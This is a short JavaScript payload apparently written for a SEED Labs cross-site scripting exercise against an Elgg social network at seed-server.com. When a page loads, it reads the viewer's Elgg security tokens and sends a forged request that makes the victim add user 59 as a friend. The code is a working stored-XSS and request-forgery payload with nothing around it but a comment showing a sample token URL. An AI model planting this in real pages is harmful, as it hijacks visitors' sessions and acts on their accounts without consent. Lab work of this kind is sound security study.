<script type="text/javascript">
window.onload = function () {
var Ajax=null;
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
var token="&__elgg_token="+elgg.security.token.__elgg_token;
//http://www.seed-server.com/action/friends/add?friend=59&__elgg_ts=1739466370&__elgg_token=ebgT5JsSHAwc76ixbCKzRQ&__elgg_ts=1739466370&__elgg_token=ebgT5JsSHAwc76ixbCKzRQ
var sendurl="http://www.seed-server.com/action/friends/add?friend=59" + token + ts;
Ajax=new XMLHttpRequest();
Ajax.open("GET", sendurl, true);
Ajax.send();
}
</script>